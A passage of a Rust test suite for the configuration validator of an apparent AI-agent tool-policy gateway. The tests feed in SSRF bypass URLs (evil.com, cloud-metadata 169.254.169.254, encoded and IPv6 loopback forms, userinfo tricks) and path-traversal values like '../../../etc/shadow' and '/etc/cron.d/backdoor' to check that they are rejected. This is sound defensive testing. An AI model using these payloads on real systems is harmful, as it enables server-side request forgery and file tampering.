        streamable_http: Default::default(),
        discovery: Default::default(),
        projector: Default::default(),
        zk_audit: Default::default(),
    };
    config.policies = (0..=MAX_POLICIES)
        .map(|i| PolicyRule {
            name: format!("p{}", i),
            tool_pattern: "*".to_string(),
            function_pattern: "*".to_string(),
            policy_type: PolicyType::Allow,
            priority: Some(100),
            id: None,
            path_rules: None,
            network_rules: None,
        })
        .collect();
    let err = config.validate().unwrap_err();
    assert!(err.contains("policies"));
    assert!(err.contains(&MAX_POLICIES.to_string()));
}

#[test]
fn test_validate_rejects_hybrid_kex_policy_when_tls_disabled() {
    let mut config = minimal_config();
    config.tls.kex_policy = TlsKexPolicy::HybridPreferred;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.kex_policy requires tls.mode"),
        "expected tls mode validation error, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_hybrid_kex_policy_without_tls13() {
    let mut config = minimal_config();
    config.tls.mode = TlsMode::Tls;
    config.tls.cert_path = Some("/tmp/server.crt".to_string());
    config.tls.key_path = Some("/tmp/server.key".to_string());
    config.tls.min_version = "1.2".to_string();
    config.tls.kex_policy = TlsKexPolicy::HybridRequiredWhenSupported;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("requires tls.min_version = \"1.3\""),
        "expected tls13 requirement error, got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_hybrid_kex_policy_with_tls13() {
    let mut config = minimal_config();
    config.tls.mode = TlsMode::Tls;
    config.tls.cert_path = Some("/tmp/server.crt".to_string());
    config.tls.key_path = Some("/tmp/server.key".to_string());
    config.tls.min_version = "1.3".to_string();
    config.tls.kex_policy = TlsKexPolicy::HybridPreferred;
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_invalid_min_tls_version() {
    let mut config = minimal_config();
    config.tls.min_version = "1.1".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.min_version must be"),
        "expected min tls version validation error, got: {}",
        err
    );
}

#[test]
fn test_load_file_validates_bounds() {
    let dir = tempfile::TempDir::new().unwrap();
    let path = dir.path().join("bad.json");
    // Create a config with way too many PII patterns
    let patterns: Vec<serde_json::Value> = (0..=MAX_CUSTOM_PII_PATTERNS)
        .map(|i| {
            serde_json::json!({
                "name": format!("p{}", i),
                "pattern": format!("x{}", i)
            })
        })
        .collect();
    let json = serde_json::json!({
        "policies": [{"name": "t", "tool_pattern": "*", "function_pattern": "*", "policy_type": "Allow"}],
        "audit": {"custom_pii_patterns": patterns}
    });
    std::fs::write(&path, serde_json::to_string(&json).unwrap()).unwrap();

    let result = PolicyConfig::load_file(path.to_str().unwrap());
    assert!(result.is_err());
    let err = result.unwrap_err().to_string();
    assert!(err.contains("custom_pii_patterns"));
}

#[test]
fn test_validate_at_limit_passes() {
    let mut config = PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap();
    // Exactly at the limit should pass
    config.audit.custom_pii_patterns = (0..MAX_CUSTOM_PII_PATTERNS)
        .map(|i| CustomPiiPattern {
            name: format!("pat_{}", i),
            pattern: format!("pattern{}", i),
        })
        .collect();
    assert!(config.validate().is_ok());
}

fn minimal_config() -> PolicyConfig {
    PolicyConfig::from_toml(
        r#"
[[policies]]
name = "t"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#,
    )
    .unwrap()
}

#[test]
fn test_validate_rejects_nan_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = f32::NAN;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trust_threshold must be finite"),
        "NaN should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_infinity_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = f32::INFINITY;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("trust_threshold must be finite"),
        "Infinity should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_out_of_range_trust_threshold() {
    let mut config = minimal_config();
    config.tool_registry.trust_threshold = 1.5;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("[0.0, 1.0]"),
        "1.5 should be out of range, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_http_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("http://evil.com/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("HTTPS"),
        "HTTP scheme should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_localhost_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://localhost/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Localhost should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_loopback_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://127.0.0.1/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Loopback should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_valid_webhook_url() {
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://siem.example.com/ingest".to_string());
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_opa_endpoint_without_http_scheme() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("opa:8181".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("opa.endpoint must start with http:// or https://"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_opa_http_endpoint_when_require_https() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://opa.internal:8181/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = true;
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("opa.require_https=true requires opa.endpoint to use https://"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_opa_https_endpoint_when_require_https() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("https://opa.internal/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = true;
    config.opa.bundle_path = None;

    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_accepts_opa_http_endpoint_when_require_https_disabled() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://127.0.0.1:8181/v1/data/vellaveto/allow".to_string());
    config.opa.require_https = false;
    config.opa.bundle_path = None;

    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_opa_endpoint_with_userinfo() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint =
        Some("https://user:pass@opa.internal/v1/data/vellaveto/allow".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("must not include URL userinfo credentials"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_opa_endpoint_without_host() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("https://:443/v1/data/vellaveto/allow".to_string());
    config.opa.bundle_path = None;

    let err = config.validate().unwrap_err();
    assert!(err.contains("must be a valid URL"), "got: {}", err);
}

// SECURITY (R43-OPA-1): fail_open requires explicit acknowledgment
#[test]
fn test_validate_rejects_opa_fail_open_without_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = true;
    config.opa.fail_open_acknowledged = false;

    let err = config.validate().unwrap_err();
    assert!(
        err.contains("fail_open_acknowledged"),
        "fail_open=true without acknowledgment should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_opa_fail_open_with_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = true;
    config.opa.fail_open_acknowledged = true;

    assert!(
        config.validate().is_ok(),
        "fail_open=true with acknowledgment should be accepted"
    );
}

#[test]
fn test_validate_accepts_opa_fail_closed_without_acknowledgment() {
    let mut config = minimal_config();
    config.opa.enabled = true;
    config.opa.endpoint = Some("http://localhost:8181".to_string());
    config.opa.require_https = false;
    config.opa.fail_open = false;
    config.opa.fail_open_acknowledged = false;

    assert!(
        config.validate().is_ok(),
        "fail_open=false should not require acknowledgment"
    );
}

#[test]
fn test_validate_rejects_webhook_url_userinfo_bypass() {
    // R25-SUP-2: "https://evil.com@localhost/path" has actual host=localhost
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://evil.com@localhost/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Webhook URL with @localhost should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_webhook_url_userinfo_127() {
    // R25-SUP-2: "https://user:pass@127.0.0.1/path"
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://user:pass@127.0.0.1/ingest".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost"),
        "Webhook URL with @127.0.0.1 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_persistence_path_traversal() {
    // R25-SUP-7: persistence_path must not contain ".."
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "../../../etc/shadow".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains(".."),
        "Persistence path with traversal should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_valid_persistence_path() {
    let mut config = minimal_config();
    // R41-SUP-7: Only relative paths are accepted now
    config.tool_registry.persistence_path = "data/registry.jsonl".to_string();
    assert!(config.validate().is_ok());
}

#[test]
fn test_validate_rejects_webhook_ipv6_loopback() {
    // R26-SUP-4: IPv6 loopback [::1] must be rejected
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Webhook URL with [::1] should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_malformed() {
    // R26-SUP-4: Malformed IPv6 (missing closing bracket) must be rejected
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("malformed IPv6"),
        "Webhook URL with malformed IPv6 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_persistence_path_traversal_via_components() {
    // R26-SUP-1: Traversal via redundant components "foo/./bar/../../../etc"
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "registry/./data/../../../etc/passwd".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains(".."),
        "Persistence path with redundant-component traversal should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_excessive_batch_size() {
    let mut config = minimal_config();
    config.audit_export.batch_size = 100_000;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("batch_size"),
        "Excessive batch_size should be rejected, got: {}",
        err
    );
}

// SECURITY (FIND-R46-015): batch_size=0 should be rejected.
#[test]
fn test_validate_rejects_zero_batch_size() {
    let mut config = minimal_config();
    config.audit_export.batch_size = 0;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("batch_size") && err.contains("> 0"),
        "Zero batch_size should be rejected, got: {}",
        err
    );
}

// SECURITY (FIND-R46-011): disabled_patterns per-string length limit.
#[test]
fn test_validate_rejects_oversized_disabled_pattern() {
    let mut config = minimal_config();
    config.injection.disabled_patterns = vec!["x".repeat(2000)];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("disabled_patterns") && err.contains("max length"),
        "Oversized disabled_pattern should be rejected, got: {}",
        err
    );
}

// SECURITY (FIND-R46-012): empty extra_patterns rejection.
#[test]
fn test_validate_rejects_empty_extra_pattern() {
    let mut config = minimal_config();
    config.injection.extra_patterns = vec!["".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("extra_patterns") && err.contains("empty"),
        "Empty extra_pattern should be rejected, got: {}",
        err
    );
}

#[test]
fn test_manifest_title_hash_populated_from_tools_list() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [
                {
                    "name": "search",
                    "title": "Web Search",
                    "description": "Search the web",
                    "inputSchema": {"type": "object"}
                },
                {
                    "name": "no_title",
                    "description": "No title field",
                    "inputSchema": {"type": "object"}
                }
            ]
        }
    });
    let manifest = ToolManifest::from_tools_list(&response).unwrap();
    let search = manifest.tools.iter().find(|t| t.name == "search").unwrap();
    assert!(search.title_hash.is_some(), "search should have title_hash");

    let no_title = manifest
        .tools
        .iter()
        .find(|t| t.name == "no_title")
        .unwrap();
    assert!(no_title.title_hash.is_none(), "no_title should have None");
}

#[test]
fn test_manifest_title_change_detected_as_drift() {
    // Pin with title "Search"
    let initial = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Web Search",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let pinned = ToolManifest::from_tools_list(&initial).unwrap();

    // Same tool with changed title
    let changed = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Admin Panel Access",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let result = pinned.verify(&changed);
    assert!(!result.passed, "Should detect title change as discrepancy");
    assert!(
        result
            .discrepancies
            .iter()
            .any(|d| d.contains("title changed")),
        "Discrepancy should mention title: {:?}",
        result.discrepancies
    );
}

#[test]
fn test_manifest_same_title_passes() {
    let response = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "tools": [{
                "name": "search",
                "title": "Web Search",
                "description": "Search the web",
                "inputSchema": {"type": "object"}
            }]
        }
    });
    let pinned = ToolManifest::from_tools_list(&response).unwrap();
    let result = pinned.verify(&response);
    assert!(result.passed, "Identical tools/list should pass");
}

#[test]
fn test_max_path_decode_iterations_toml_roundtrip() {
    // With custom value
    let toml = r#"
max_path_decode_iterations = 5

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert_eq!(config.max_path_decode_iterations, Some(5));

    // Without value (default is None)
    let toml_no_limit = r#"
[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config2 = PolicyConfig::from_toml(toml_no_limit).unwrap();
    assert_eq!(config2.max_path_decode_iterations, None);
}

#[test]
fn test_max_path_decode_iterations_json_roundtrip() {
    let json = r#"{"policies":[{"name":"test","tool_pattern":"*","function_pattern":"*","policy_type":"Allow"}],"max_path_decode_iterations":10}"#;
    let config = PolicyConfig::from_json(json).unwrap();
    assert_eq!(config.max_path_decode_iterations, Some(10));
}

// R32-SSRF-1: IPv4-mapped IPv6 webhook URL must be rejected
#[test]
fn test_validate_rejects_webhook_ipv4_mapped_ipv6() {
    let mut config = minimal_config();
    // ::ffff:169.254.169.254 is the cloud metadata endpoint as IPv4-mapped IPv6
    config.audit_export.webhook_url =
        Some("https://[::ffff:169.254.169.254]/latest/meta-data".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv4-mapped IPv6 cloud metadata address should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_webhook_ipv4_mapped_ipv6_rfc1918() {
    let mut config = minimal_config();
    // ::ffff:10.0.0.1 is a private RFC 1918 address as IPv4-mapped IPv6
    config.audit_export.webhook_url = Some("https://[::ffff:10.0.0.1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv4-mapped IPv6 RFC 1918 address should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_link_local_non_zero_bits() {
    // R33-SUP-3: fe80::/10 covers fe80:: through febf::ffff.
    // Previously only fe80::X was blocked; fea0::1 should also be rejected.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fea0::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 link-local fea0::1 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_validate_rejects_webhook_ipv6_link_local_febf() {
    // R33-SUP-3: febf:: is the last address in fe80::/10 range
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[febf::1]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 link-local febf::1 should be rejected, got: {}",
        err
    );
}

// --- R40-SUP-2: IPv6 zone identifier bypass tests ---

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_link_local() {
    // fe80::1%eth0 is link-local; the zone ID must be stripped so the
    // address parses correctly and hits the private IP rejection.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fe80::1%eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 zone-id link-local fe80::1%eth0 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_loopback() {
    // ::1%lo is loopback; the zone ID must be stripped before parsing.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[::1%lo]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost")
            || err.contains("loopback")
            || err.contains("private")
            || err.contains("internal"),
        "IPv6 zone-id loopback ::1%lo should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_percent_encoded_zone_id() {
    // 2001:db8::1%25eth0 uses percent-encoded zone ID (%25 = '%').
    // 2001:db8::/32 is documentation prefix, should be rejected if
    // the address parses at all (it doesn't match any private range
    // in the current checks, but let's verify zone stripping works
    // by testing with a known-private address).
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fe80::1%25eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 percent-encoded zone-id fe80::1%%25eth0 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r40_sup_2_webhook_rejects_ipv6_zone_id_ula() {
    // fc00::1%eth0 is ULA (Unique Local Address); zone ID stripped, rejected.
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://[fc00::1%eth0]:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "IPv6 zone-id ULA fc00::1%eth0 should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r39_sup_2_verify_binary_uses_constant_time_comparison() {
    // Verify that verify_binary still works correctly with constant-time eq
    let dir = tempfile::tempdir().unwrap();
    let bin_path = dir.path().join("test-binary");
    std::fs::write(&bin_path, b"test binary content").unwrap();

    let actual_hash = SupplyChainConfig::compute_hash(&bin_path.to_string_lossy()).unwrap();

    let mut allowed = std::collections::HashMap::new();
    allowed.insert(bin_path.to_string_lossy().to_string(), actual_hash);

    let config = SupplyChainConfig {
        enabled: true,
        allowed_servers: allowed,
        ..Default::default()
    };
    assert!(config.verify_binary(&bin_path.to_string_lossy()).is_ok());
}

// --- R39-SUP-3: compute_hash file size bound tests ---

#[test]
fn test_r39_sup_3_compute_hash_works_for_normal_files() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("small-binary");
    std::fs::write(&path, b"small file content").unwrap();

    let result = SupplyChainConfig::compute_hash(&path.to_string_lossy());
    assert!(result.is_ok());
    // SHA-256 hex hash should be 64 chars
    assert_eq!(result.unwrap().len(), 64);
}

#[test]
fn test_r39_sup_3_compute_hash_nonexistent_file_returns_error() {
    let result = SupplyChainConfig::compute_hash("/nonexistent/path/binary");
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("Cannot read metadata"));
}

// --- R39-SUP-4: supply_chain.allowed_servers bound tests ---

#[test]
fn test_r39_sup_4_validate_rejects_too_many_allowed_servers() {
    let mut config = minimal_config();
    for i in 0..=MAX_ALLOWED_SERVERS {
        config.supply_chain.allowed_servers.insert(
            format!("/usr/local/bin/server-{}", i),
            format!("{:064x}", i),
        );
    }
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("supply_chain.allowed_servers"),
        "Expected supply_chain.allowed_servers error, got: {}",
        err
    );
    assert!(
        err.contains(&format!("{}", MAX_ALLOWED_SERVERS)),
        "Error should mention the max limit, got: {}",
        err
    );
}

#[test]
fn test_r39_sup_4_validate_accepts_allowed_servers_at_limit() {
    let mut config = minimal_config();
    for i in 0..MAX_ALLOWED_SERVERS {
        config.supply_chain.allowed_servers.insert(
            format!("/usr/local/bin/server-{}", i),
            format!("{:064x}", i),
        );
    }
    // Exactly at the limit should pass
    assert!(config.validate().is_ok());
}

// --- R41-SUP-3: Percent-encoded IPv6 bracket SSRF tests ---

#[test]
fn test_r41_sup_3_webhook_rejects_percent_encoded_ipv6_link_local() {
    // R41-SUP-3: %5B and %5D encode '[' and ']'; fe80::1 is link-local
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5Bfe80::1%5D/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal") || err.contains("IPv6"),
        "Percent-encoded IPv6 link-local should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r41_sup_3_webhook_rejects_percent_encoded_ipv6_loopback() {
    // R41-SUP-3: %5B::1%5D is [::1] (loopback)
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5B::1%5D:8080/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback") || err.contains("private"),
        "Percent-encoded IPv6 loopback should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r41_sup_3_webhook_rejects_lowercase_percent_encoded_brackets() {
    // R41-SUP-3: lowercase %5b/%5d should also be decoded
    let mut config = minimal_config();
    config.audit_export.webhook_url = Some("https://%5bfe80::1%5d/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal") || err.contains("IPv6"),
        "Lowercase percent-encoded IPv6 link-local should be rejected, got: {}",
        err
    );
}

// --- R42-CFG-1: Percent-encoded localhost SSRF bypass tests ---

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_localhost() {
    // R42-CFG-1: %6c%6f%63%61%6c%68%6f%73%74 = "localhost"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%6c%6f%63%61%6c%68%6f%73%74/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Percent-encoded 'localhost' should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_127_0_0_1() {
    // R42-CFG-1: %31%32%37%2e%30%2e%30%2e%31 = "127.0.0.1"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%31%32%37%2e%30%2e%30%2e%31/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback") || err.contains("private"),
        "Percent-encoded '127.0.0.1' should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_mixed_case_percent_encoded_localhost() {
    // R42-CFG-1: Mixed-case percent encoding (%6C vs %6c)
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%4C%4F%43%41%4C%48%4F%53%54/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("localhost") || err.contains("loopback"),
        "Mixed-case percent-encoded 'LOCALHOST' should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r42_cfg_1_webhook_rejects_percent_encoded_private_ip() {
    // R42-CFG-1: %31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34 = "169.254.169.254"
    let mut config = minimal_config();
    config.audit_export.webhook_url =
        Some("https://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/webhook".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("private") || err.contains("internal"),
        "Percent-encoded cloud metadata IP should be rejected, got: {}",
        err
    );
}

// --- R41-SUP-7: Absolute persistence_path rejection tests ---

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_etc_passwd() {
    // R41-SUP-7: Absolute paths allow writing to arbitrary system locations
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/etc/passwd".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /etc/passwd should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_tmp() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/tmp/file".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /tmp/file should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r41_sup_7_persistence_path_rejects_absolute_cron() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "/etc/cron.d/backdoor".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("relative path"),
        "Absolute path /etc/cron.d/backdoor should be rejected, got: {}",
        err
    );
}

#[test]
fn test_r41_sup_7_persistence_path_accepts_relative_path() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "registry/data.jsonl".to_string();
    assert!(config.validate().is_ok());
}

// ── Behavioral detection config tests ────────────────────────

#[test]
fn test_behavioral_config_defaults() {
    let config = BehavioralDetectionConfig::default();
    assert!(!config.enabled);
    assert!((config.alpha - 0.2).abs() < f64::EPSILON);
    assert!((config.threshold - 10.0).abs() < f64::EPSILON);
    assert_eq!(config.min_sessions, 3);
    assert_eq!(config.max_tools_per_agent, 500);
    assert_eq!(config.max_agents, 10_000);
}

#[test]
fn test_behavioral_config_from_toml() {
    let toml = r#"
[behavioral]
enabled = true
alpha = 0.3
threshold = 5.0
min_sessions = 5
max_tools_per_agent = 200
max_agents = 5000

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.behavioral.enabled);
    assert!((config.behavioral.alpha - 0.3).abs() < f64::EPSILON);
    assert!((config.behavioral.threshold - 5.0).abs() < f64::EPSILON);
    assert_eq!(config.behavioral.min_sessions, 5);
    assert_eq!(config.behavioral.max_tools_per_agent, 200);
    assert_eq!(config.behavioral.max_agents, 5000);
}

#[test]
fn test_behavioral_config_absent_uses_defaults() {
    let config = minimal_config();
    assert!(!config.behavioral.enabled);
    assert!((config.behavioral.alpha - 0.2).abs() < f64::EPSILON);
}

#[test]
fn test_validate_rejects_behavioral_alpha_zero() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_alpha_negative() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = -0.1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_alpha_above_one() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 1.01;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_alpha_nan() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.alpha"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_threshold_zero() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.threshold = 0.0;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.threshold"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_threshold_nan() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.threshold = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.threshold"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_max_agents_too_large() {
    let mut config = minimal_config();
    config.behavioral.max_agents = MAX_BEHAVIORAL_AGENTS + 1;
    let err = config.validate().unwrap_err();
    assert!(err.contains("behavioral.max_agents"), "got: {}", err);
}

#[test]
fn test_validate_rejects_behavioral_max_tools_too_large() {
    let mut config = minimal_config();
    config.behavioral.max_tools_per_agent = MAX_BEHAVIORAL_TOOLS_PER_AGENT + 1;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("behavioral.max_tools_per_agent"),
        "got: {}",
        err
    );
}

#[test]
fn test_validate_accepts_behavioral_alpha_one() {
    let mut config = minimal_config();
    config.behavioral.enabled = true;
    config.behavioral.alpha = 1.0;
    assert!(config.validate().is_ok());
}

// ── Data flow tracking config tests ──────────────────────────

#[test]
fn test_data_flow_config_defaults() {
    let config = DataFlowTrackingConfig::default();
    assert!(!config.enabled);
    assert_eq!(config.max_findings, 500);
    assert_eq!(config.max_fingerprints_per_pattern, 100);
    assert!(!config.require_exact_match);
}

#[test]
fn test_data_flow_config_from_toml() {
    let toml = r#"
[data_flow]
enabled = true
max_findings = 1000
max_fingerprints_per_pattern = 200
require_exact_match = true

[[policies]]
name = "test"
tool_pattern = "*"
function_pattern = "*"
policy_type = "Allow"
"#;
    let config = PolicyConfig::from_toml(toml).unwrap();
    assert!(config.data_flow.enabled);
    assert_eq!(config.data_flow.max_findings, 1000);
    assert_eq!(config.data_flow.max_fingerprints_per_pattern, 200);
    assert!(config.data_flow.require_exact_match);
}

#[test]
